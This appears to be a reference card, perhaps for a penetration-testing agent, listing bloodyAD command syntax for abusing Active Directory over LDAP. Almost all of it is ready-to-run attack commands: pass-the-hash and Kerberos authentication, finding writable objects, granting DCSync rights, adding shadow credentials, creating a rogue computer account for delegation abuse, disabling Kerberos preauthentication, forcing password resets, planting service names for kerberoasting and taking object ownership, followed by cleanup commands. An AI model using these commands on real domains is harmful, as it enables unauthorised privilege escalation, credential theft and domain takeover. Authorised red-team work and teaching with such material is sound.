name: bloodyAD Toolkit (Linux AD Abuse Reference)
description: Reference for bloodyAD - a Linux tool to enumerate and abuse AD objects over LDAP: find writable objects, add group members, set passwords, add DCSync rights, add shadow credentials, and set arbitrary attributes. Works with password, NT hash (-p :<hash>), or Kerberos (-k).
notes:
=== AUTH FORMS ===
  -u <user> -p <password>          # password
  -u <user> -p :<nthash>           # pass-the-hash
  -k                               # Kerberos (needs KRB5CCNAME + clock sync)
  --host <dc_ip> -d <domain>       # always

=== ENUMERATE ===
  get writable                     # objects you can write (the money query)
  get object <target> --attr <a>   # read attributes
  get children --otype user        # list users
  get search --filter '(objectClass=user)'

=== ABUSE (add) ===
  add groupMember "<group>" <user>             # -> ad-genericall-group
  add dcsync <user>                            # -> ad-writedacl-linux
  add shadowCredentials <target>               # -> ad-shadow-credentials
  add computer 'EVIL$' 'Passw0rd!'             # add a computer (RBCD)
  add uac <target> -f DONT_REQ_PREAUTH         # make AS-REP roastable

=== ABUSE (set) ===
  set password <target> '<new_password>'       # -> ad-force-change-password
  set object <target> servicePrincipalName -v 'fake/svc'   # -> ad-targeted-kerberoast
  set owner <target> <user>                     # take ownership (then WriteDACL)

=== CLEANUP (remove) ===
  remove groupMember "<group>" <user>
  remove dcsync <user>
  remove object <target> servicePrincipalName

Always clean up ACEs, SPNs, key credentials and added accounts you created.

recommended.note: Map the writable edge you found to the right abuse.
